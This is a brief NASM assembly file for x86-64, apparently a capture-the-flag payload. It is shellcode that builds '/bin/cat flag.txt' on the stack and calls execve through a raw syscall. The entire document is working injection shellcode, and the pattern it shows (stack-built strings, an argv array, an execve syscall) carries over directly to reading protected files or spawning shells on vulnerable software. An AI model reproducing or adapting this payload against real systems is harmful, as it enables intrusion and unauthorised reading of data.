; Author: Arvind
; Date: 12/12/16
; Program: Normal shellcode

BITS 64
section .text
    global shellcode

    shellcode:
        xor rsi,rsi
        mov rdx , rsi
        push rdx
        mov r14 , 0x7461632f6e69622f   ;/bin/cat
        mov r15 , 0x7478742e67616c66  ;flag.txt
        push r15
        mov  r9 , rsp 
        push rdx
        push r14
        mov r10 , rsp
        push rdx
        push r9
        push r10
        push 0x3b
        pop rax
        mov rsi , rsp
        mov rdi , r10
        syscall
